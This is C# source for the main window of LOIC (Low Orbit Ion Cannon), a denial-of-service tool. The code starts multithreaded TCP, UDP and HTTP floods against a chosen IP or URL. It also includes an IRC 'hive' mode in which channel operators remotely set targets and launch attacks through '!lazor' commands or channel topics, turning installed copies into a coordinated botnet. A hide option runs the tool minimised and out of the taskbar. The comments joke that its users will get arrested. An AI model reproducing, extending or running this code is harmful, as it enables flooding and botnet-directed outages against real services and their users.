/* LOIC - Low Orbit Ion Cannon
 * Released to the public domain
 * Enjoy getting v&, kids.
 */

using Meebey.SmartIrc4net;
using PcapDotNet.Core;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace LOIC
{
	public partial class frmMain : Form
	{
		#region IRC

		private static IrcClient irc;
		private static Thread irclisten;
		private static string channel;
		private static bool ircenabled = false;
		private static Dictionary<string, string> OpList;

		private void enableHive_CheckedChanged(object sender, EventArgs e)
		{
			if (enableHive.Checked)
			{
				DoHive(true);
			}
		}

		private void disableHive_CheckedChanged(object sender, EventArgs e)
		{
			if (disableHive.Checked)
			{
				DoHive(false);
			}
		}

		private void DoHive(bool enabled)
		{
			try
			{
				// Is everything ok?
				if ((txtIRCserver.Text == "" || txtIRCchannel.Text == "") && enabled)
				{
					disableHive.Checked = true;
				}
				else if (enabled)
				{
					try
					{
						IPHostEntry ipHost = Dns.GetHostEntry(txtIRCserver.Text);
					}
					catch
					{
						disableHive.Checked = true;
					}
				}
				if (disableHive.Checked && enabled)
				{
					new frmWtf().Show();
					MessageBox.Show("Did you filled IRC options correctly?", "What the shit.");
					return;
				}

				// We are starting connection. Disable input in IRC boxes.
				txtIRCserver.Enabled = !enabled;
				txtIRCport.Enabled = !enabled;
				txtIRCchannel.Enabled = !enabled;

				// Lets try this!
				ircenabled = enabled;
				if (enabled)
				{
					label25.Text = "Connecting..";
					irc = new IrcClient();
					irc.OnConnected += IrcConnected;
					irc.OnReadLine += OnReadLine;
					irc.OnChannelMessage += OnMessage;
					irc.OnOp += OnOp;
					irc.OnDeop += OnDeOp;
					irc.OnPart += OnPart;
					irc.OnNickChange += OnNickChange;
					irc.OnTopic += OnTopic;
					irc.OnTopicChange += OnTopicChange;
					irc.OnQuit += OnQuit;
					irc.OnKick += OnKick;
					irc.OnDisconnected += IrcDisconnected;
					irc.OnNames += OnNames;
					irc.AutoRejoinOnKick = true;
					irc.AutoRejoin = true;
					try
					{
						int port;
						if (!int.TryParse(txtIRCport.Text, out port)) port = 6667;
						irc.Connect(txtIRCserver.Text, port);
						channel = txtIRCchannel.Text.ToLower();

						irc.Login("LOIC_" + Functions.RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");

						// Spawn a thread to handle the listen.
						irclisten = new Thread(new ThreadStart(IrcListenThread));
						irclisten.Start();
					}
					catch
					{
					}
				}
				else
				{
					try
					{
						if (irc != null) irc.Disconnect();
					}
					catch
					{
					}
					label25.Text = "Disconnected.";
				}
			}
			catch
			{
			}
		}

		private void IrcListenThread()
		{
			while (ircenabled)
			{
				irc.Listen();
			}
		}

		private void IrcDisconnected(object o, EventArgs e)
		{
			if (ircenabled)
			{
				try
				{
					int port;
					if (!int.TryParse(txtIRCport.Text, out port)) port = 6667;
					irc.Connect(txtIRCserver.Text, port);
					irc.Login("LOIC_" + Functions.RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
				}
				catch
				{
				}
			}
		}

		private void IrcConnected(object o, EventArgs e)
		{
			label25.Text = "Logging In...";
		}

		private void OnNames(object sender, NamesEventArgs e)
		{
			SetStatus("Connected!");
			if (OpList != null)
			{
				OpList.Clear();
			}
			else
			{
				if (OpList == null) OpList = new Dictionary<string, string>();
			}

			foreach (string user in e.UserList)
			{
				if (user.StartsWith("@") || user.StartsWith("&") || user.StartsWith("~"))
				{
					OpList.Add(user.Substring(1), "");
				}
			}
		}

		private void OnOp(object sender, OpEventArgs e)
		{
			if (OpList == null) OpList = new Dictionary<string, string>();
			if (!OpList.ContainsKey(e.Whom))
			{
				OpList.Add(e.Whom, "");
			}
		}

		private void OnDeOp(object sender, DeopEventArgs e)
		{
			if (OpList == null) OpList = new Dictionary<string, string>();
			if (OpList.ContainsKey(e.Whom))
			{
				OpList.Remove(e.Whom);
			}
		}

		private void OnPart(object sender, PartEventArgs e)
		{
			if (OpList == null) OpList = new Dictionary<string, string>();
			if (OpList.ContainsKey(e.Who))
			{
				OpList.Remove(e.Who);
			}
		}

		private void OnQuit(object sender, QuitEventArgs e)
		{
			if (OpList == null) OpList = new Dictionary<string, string>();
			if (OpList.ContainsKey(e.Who))
			{
				OpList.Remove(e.Who);
			}
		}

		private void OnTopic(object sender, TopicEventArgs e)
		{
			if (e.Channel.ToLower() == channel && e.Topic.StartsWith("!lazor "))
			{
				List<string> pars = new List<string>(e.Topic.Split(' '));
				SetStatus("Controlled by topic");
				try
				{
					txtTargetIP.Invoke(new CheckParamsDelegate(CheckParams), pars);
				}
				catch
				{
				}
			}
		}

		private void OnTopicChange(object sender, TopicChangeEventArgs e)
		{
			if (e.Channel.ToLower() == channel && e.NewTopic.StartsWith("!lazor "))
			{
				List<string> pars = new List<string>(e.NewTopic.Split(' '));
				SetStatus("Controlled by topic");
				try
				{
					txtTargetIP.Invoke(new CheckParamsDelegate(CheckParams), pars);
				}
				catch
				{
				}
			}
		}

		private void OnNickChange(object sender, NickChangeEventArgs e)
		{
			if (OpList.ContainsKey(e.OldNickname))
			{
				OpList.Remove(e.OldNickname);
			}
			if (!OpList.ContainsKey(e.NewNickname))
			{
				OpList.Add(e.NewNickname, "");
			}
		}

		private void OnKick(object sender, KickEventArgs e)
		{
			if (OpList == null) OpList = new Dictionary<string, string>();
			if (OpList.ContainsKey(e.Whom))
			{
				OpList.Remove(e.Whom);
			}
		}

		private void SetStatus(string status)
		{
			if (label25.InvokeRequired)
			{
				label25.Invoke(new SetStatusDelegate(SetStatus), status);
			}
			else
			{
				label25.Text = status;
			}
		}

		private void OnMessage(object sender, IrcEventArgs e)
		{
			if (e.Data.Channel.ToLower() == channel)
			{
				if (e.Data.Message.StartsWith("!lazor "))
				{
					//authenticate
					if (OpList != null && OpList.ContainsKey(e.Data.Nick))
					{
						List<string> pars = new List<string>(e.Data.Message.Split(' '));
						SetStatus("Controlled by " + e.Data.Nick);
						try
						{
							txtTargetIP.Invoke(new CheckParamsDelegate(CheckParams), pars);
						}
						catch
						{
						}
					}
				}
			}
		}

		#endregion IRC

		public frmMain(bool hive, bool hide, string ircserver, string ircport, string ircchannel)
		{
			InitializeComponent();

			// IRC
			if (!ircserver.Equals(""))
				txtIRCserver.Text = ircserver;
			if (!ircport.Equals(""))
				txtIRCport.Text = ircport;
			if (!ircchannel.Equals(""))
				txtIRCchannel.Text = ircchannel;

			if (hide)
			{
				this.WindowState = FormWindowState.Minimized;
				this.ShowInTaskbar = false;
			}

			if (hive) enableHive.Checked = true;
			if (!hive) disableHive.Checked = true;

			CheckForIllegalCrossThreadCalls = false;
			tbSourceIP.Text = Utils.LocalIPAddress();
			IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
			if (allDevices.Count == 0)
			{
				MessageBox.Show("Winpcap is missing or not installed. Please fix this!");
				btnAttack.Enabled = false;

			}
			for (int i = 0; i != allDevices.Count(); ++i)
			{
				cbAdapter.Items.Add(allDevices[i].Description);
			}
		}

		private static XXPFlooder[] xxp;
		private static HTTPFlooder[] http;

		private void Attack(bool toggle, bool on, bool silent)
		{
			if ((btnAttack.Text == "IMMA CHARGIN MAH LAZER" && toggle == true) || (toggle == false && on == true))
			{
				try
				{
					if (Settings.AttackType == 0)
						throw new Exception("Select a proper attack method.");
				}
				catch (Exception ex)
				{
					if (silent) return;
					new frmWtf().Show(); MessageBox.Show(ex.Message, "What the shit."); return;
				}
				btnAttack.Text = "Stop flooding";

				if (String.Equals(Settings.Method, "TCP") || String.Equals(Settings.Method, "UDP"))
				{
					xxp = new XXPFlooder[Settings.NumThreads];
					for (int a = 0; a < xxp.Length; a++)
					{
						xxp[a] = new XXPFlooder(Settings.TargetIp, Settings.TargetPort, Settings.Protocol, Settings.Delay, chkWaitReply.Checked, Settings.Payload, chkAllowRandom.Checked);
						xxp[a].Start();
					}
				}
				else if (String.Equals(Settings.Method, "HTTP"))
				{
					http = new HTTPFlooder[Settings.NumThreads];
					for (int a = 0; a < http.Length; a++)
					{
						http[a] = new HTTPFlooder(Settings.TargetHost, Settings.TargetIp, Settings.TargetPort, Settings.RelativePath, chkWaitReply.Checked, Settings.Delay, Settings.Timeout, chkAllowRandom.Checked, chkAllowGzip.Checked);
						http[a].Start();
					}
				}
				tShowStats.Start();
			}
			else if (toggle == true || on == false)
			{
				btnAttack.Text = "IMMA CHARGIN MAH LAZER";
				if (xxp != null)
				{
					for (int a = 0; a < xxp.Length; a++)
					{
						xxp[a].IsFlooding = false;
					}
				}
				if (http != null)
				{
					for (int a = 0; a < http.Length; a++)
					{
						http[a].IsFlooding = false;
					}
				}
				//tShowStats.Stop();
			}
		}

		private void LockOnIP(bool silent)
		{
			if (txtTargetIP.Text.Length == 0)
			{
				if (silent) return;
				new frmWtf().Show();
				MessageBox.Show("I think you forgot the IP.", "What the shit.");
				return;
			}
			txtTarget.Text = txtTargetIP.Text;
			Settings.TargetHost = txtTargetIP.Text;
		}

		private void LockOnURL(bool silent)
		{
			Settings.TargetHost = txtTargetURL.Text.ToLower();
			if (String.IsNullOrEmpty(Settings.TargetHost))
			{
				if (silent) return;
				new frmWtf().Show();
				MessageBox.Show("A URL is fine too...", "What the shit.");
				return;
			}
			if (!Settings.TargetHost.StartsWith("http://") && !Settings.TargetHost.StartsWith("https://")) Settings.TargetHost = String.Concat("http://", Settings.TargetHost);
			try { txtTarget.Text = Dns.GetHostEntry(new Uri(Settings.TargetHost).Host).AddressList[0].ToString(); }
			catch
			{
				if (silent) return;
				new frmWtf().Show();
				MessageBox.Show("The URL you entered does not resolve to an IP!", "What the shit.");
				return;
			}
		}

		private void CheckParams(List<string> pars)
		{
			Attack(false, false, true);

			foreach (string param in pars)
			{
				string[] sp = param.Split('=');
				if (sp.Length > 1)
				{
					string cmd = sp[0];

					// Find param value
					string value = "";
					for (int key = 0; key < sp.Length; ++key)
					{
						if (key >= 1)
							value += sp[key] + ((key + 1 < sp.Length) ? "=" : "");
					}

					int num;
					bool isnum;
					switch (cmd.ToLower())
					{
						case "targetip":
							txtTargetIP.Text = value;
							LockOnIP(true);
							break;

						case "targethost":
							txtTargetURL.Text = value;
							LockOnURL(true);
							break;

						case "timeout":
							isnum = int.TryParse(value, out num);
							if (isnum)
								txtTimeout.Text = num.ToString();
							break;

						case "subsite":
							txtSubsite.Text = value;
							break;

						case "message":
							txtData.Text = value;
							break;

						case "port":
							txtPort.Text = value;
							break;

						case "method":
							int index = cbMethod.FindString(value);
							if (index != -1)
								cbMethod.SelectedIndex = index;
							break;

						case "threads":
							isnum = int.TryParse(value, out num);
							if (isnum && num < 100) //let's protect them a bit, yeah?
								txtThreads.Text = num.ToString();
							break;

						case "wait":
							if (value.ToLower() == "true")
							{
								chkWaitReply.Checked = true;
							}
							else if (value.ToLower() == "false")
							{
								chkWaitReply.Checked = false;
							}
							break;

						case "random":
							if (value.ToLower() == "true")
							{
								chkAllowRandom.Checked = true;
							}
							else if (value.ToLower() == "false")
							{
								chkAllowRandom.Checked = false;
							}
							break;

						case "gzip":
							if (value.ToLower() == "true")
							{
								chkAllowGzip.Checked = true;
							}
							else if (value.ToLower() == "false")
							{
								chkAllowGzip.Checked = false;
							}
							break;

						case "speed":
							isnum = int.TryParse(value, out num);
							if (isnum && num >= 0 && num <= 20) //let's protect them a bit, yeah?
							{
								tbSpeed.Value = num;
							}
							break;
					}
				}
				else
				{
					if (sp[0].ToLower() == "start")
					{
						Attack(false, true, true);
						return;
					}
					else if (sp[0].ToLower() == "default")
					{
						txtTargetIP.Text = "";
						txtTargetURL.Text = "";
						txtTimeout.Text = "9001";
						txtSubsite.Text = "/";
						txtData.Text = "U dun goofed";
						txtPort.Text = "80";
						int index = cbMethod.FindString("TCP");
						if (index != -1) { cbMethod.SelectedIndex = index; }
						txtThreads.Text = "10";
						chkWaitReply.Checked = true;
						chkAllowRandom.Checked = false;
						chkAllowGzip.Checked = true;
						tbSpeed.Value = 0;
					}
				}
			}
			SetStatus("Waiting.");
		}

		private void OnReadLine(object sender, ReadLineEventArgs e)
		{
			string command = e.Line.Split(' ')[1];
			if (command.Equals("PING"))
			{
				string server = e.Line.Split(' ')[2];
				irc.WriteLine("PONG " + server, Priority.Critical);
			}
			else if (command.Equals("422") || command.Equals("376")) // 422: motd missing // 376: end of motd
			{
				if (OpList != null) OpList.Clear();
				irc.RfcJoin(channel);
			}
		}

		private void frmMain_Load(object sender, EventArgs e)
		{
			this.Text = String.Format("{0} | U dun goofed | v. {1}", Application.ProductName, Application.ProductVersion);
		}

		private void frmMain_Closing(object sender, FormClosingEventArgs e)
		{
			try
			{
				ircenabled = false;
				if (irclisten != null) irclisten.Abort();
				if (irc != null) irc.Disconnect();
			}
			catch
			{ }
			finally
			{
				Environment.Exit(0);
			}
		}

		private void cmdTargetURL_Click(object sender, EventArgs e)
		{
			LockOnURL(false);
		}

		private void cmdTargetIP_Click(object sender, EventArgs e)
		{
			LockOnIP(false);
		}

		private void txtTarget_Enter(object sender, EventArgs e)
		{
			btnAttack.Focus();
		}

		private void cmdAttack_Click(object sender, EventArgs e)
		{
			UpdateSettings();
			Attack(true, false, false);
		}

		private void tShowStats_Tick(object sender, EventArgs e)
		{
			if (Settings.IntShowStats) return; Settings.IntShowStats = true;

			bool isFlooding = false;
			if (btnAttack.Text == "Stop for now") isFlooding = true;
			if (Settings.AttackType == AttackTypes.TcpFlood || Settings.AttackType == AttackTypes.UdpFlood)
			{
				int iFloodCount = 0;
				for (int a = 0; a < xxp.Length; a++)
				{
					iFloodCount += xxp[a].FloodCount;
				}
				lbRequested.Text = iFloodCount.ToString();
			}
			if (Settings.AttackType == AttackTypes.HttpFlood && http != null)
			{
				int iIdle = 0;
				int iConnecting = 0;
				int iRequesting = 0;
				int iDownloading = 0;
				int iDownloaded = 0;
				int iRequested = 0;
				int iFailed = 0;

				for (int a = 0; a < http.Length; a++)
				{
					iDownloaded += http[a].Downloaded;
					iRequested += http[a].Requested;
					iFailed += http[a].Failed;
					if (http[a].State == HTTPFlooder.ReqState.Ready ||
						http[a].State == HTTPFlooder.ReqState.Completed)
						iIdle++;
					if (http[a].State == HTTPFlooder.ReqState.Connecting)
						iConnecting++;
					if (http[a].State == HTTPFlooder.ReqState.Requesting)
						iRequesting++;
					if (http[a].State == HTTPFlooder.ReqState.Downloading)
						iDownloading++;
					if (isFlooding && !http[a].IsFlooding)
					{
						int iaDownloaded = http[a].Downloaded;
						int iaRequested = http[a].Requested;
						int iaFailed = http[a].Failed;
						http[a] = null;
						http[a] = new HTTPFlooder(Settings.TargetHost, Settings.TargetIp, Settings.TargetPort, Settings.RelativePath, chkWaitReply.Checked, Settings.Delay, Settings.Timeout, chkAllowRandom.Checked, chkAllowGzip.Checked);
						http[a].Downloaded = iaDownloaded;
						http[a].Requested = iaRequested;
						http[a].Failed = iaFailed;
						http[a].Start();
					}
				}
				lbFailed.Text = iFailed.ToString();
				lbRequested.Text = iRequested.ToString();
				lbDownloaded.Text = iDownloaded.ToString();
				lbDownloading.Text = iDownloading.ToString();
				lbRequesting.Text = iRequesting.ToString();
				lbConnecting.Text = iConnecting.ToString();
				lbIdle.Text = iIdle.ToString();
			}

			Settings.IntShowStats = false;
		}

		private void tbSpeed_ValueChanged(object sender, EventArgs e)
		{
			Settings.Delay = tbSpeed.Value;
			if (http != null)
			{
				for (int a = 0; a < http.Length; a++)
				{
					if (http[a] != null) http[a].Delay = Settings.Delay;
				}
			}
			if (xxp != null)
			{
				for (int a = 0; a < xxp.Length; a++)
				{
					if (xxp[a] != null) xxp[a].Delay = Settings.Delay;
				}
			}
		}

		private void UpdateSettings()
		{
			// set interface
			IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
			Settings.SelectedDevice = allDevices[cbAdapter.SelectedIndex];
			
			// attack type
			Settings.Method = cbMethod.Text;
			if (String.Equals(Settings.Method, "TCP"))
			{
				Settings.AttackType = AttackTypes.TcpFlood;
				//Settings.Protocol = 1;
			}
			if (String.Equals(Settings.Method, "UDP"))
			{
				Settings.AttackType = AttackTypes.UdpFlood;
				 //Settings.Protocol = 2;
			}
			if (String.Equals(Settings.Method, "HTTP"))
			{
				Settings.AttackType = AttackTypes.HttpFlood; 
				//Settings.Protocol = 3;
			}
			

			// flags
			Settings.SYN = cbSyn.Checked;
			Settings.ACK = cbAck.Checked;
			Settings.FIN = cbFin.Checked;
			Settings.RST = cbRst.Checked;
			Settings.URG = cbUrg.Checked;
			Settings.PSH = cbPsh.Checked;
			Settings.ENC = cbEnc.Checked;
			Settings.CWR = cbCwr.Checked;
			Settings.NONE = cbNone.Checked;
			Settings.NS = cbNs.Checked;

			// target
			try { Settings.TargetPort = Convert.ToInt32(txtPort.Text); }
			catch { throw new Exception("I don't think ports are supposed to be written like THAT."); }

			try { Settings.NumThreads = Convert.ToInt32(txtThreads.Text); }
			catch { throw new Exception("What on earth made you put THAT in the threads field?"); }

			try
			{
				Settings.TargetIp = txtTarget.Text;
				if (String.IsNullOrEmpty(Settings.TargetIp) || String.Equals(Settings.TargetIp, "N O N E !"))
					throw new Exception("Select a target.");
			}
			catch { throw new Exception("What on earth made you put THAT in the target field?"); }

			if (String.IsNullOrEmpty(Settings.TargetHost)) Settings.TargetHost = Settings.TargetIp;
			if (!Settings.TargetHost.Contains("://")) Settings.TargetHost = String.Concat("http://", Settings.TargetHost);
			Settings.TargetHost = new Uri(Settings.TargetHost).Host;

			

			Settings.Payload = txtData.Text.Replace("\\r", "\r").Replace("\\n", "\n");
			if (String.IsNullOrEmpty(Settings.Payload) && (Settings.AttackType == AttackTypes.TcpFlood || Settings.AttackType == AttackTypes.UdpFlood))
				throw new Exception("Gonna spam with no contents? You're a wise fellow, aren't ya? o.O");

			Settings.RelativePath = txtSubsite.Text;
			if (!Settings.RelativePath.StartsWith("/") && (Settings.AttackType == AttackTypes.HttpFlood))
				throw new Exception("You have to enter a subsite (for example \"/\")");

			try { Settings.Timeout = Convert.ToInt32(txtTimeout.Text); }
			catch { throw new Exception("What's up with something like that in the timeout box? =S"); }


		}

		private void label24_Click(object sender, EventArgs e)
		{
			System.Diagnostics.Process.Start("http://github.com/NewEraCracker/LOIC");
		}

		private delegate void CheckParamsDelegate(List<string> pars);

		private delegate void AddListBoxItemDelegate(object sender, ReadLineEventArgs e);

		private delegate void SetStatusDelegate(string status);
	}
}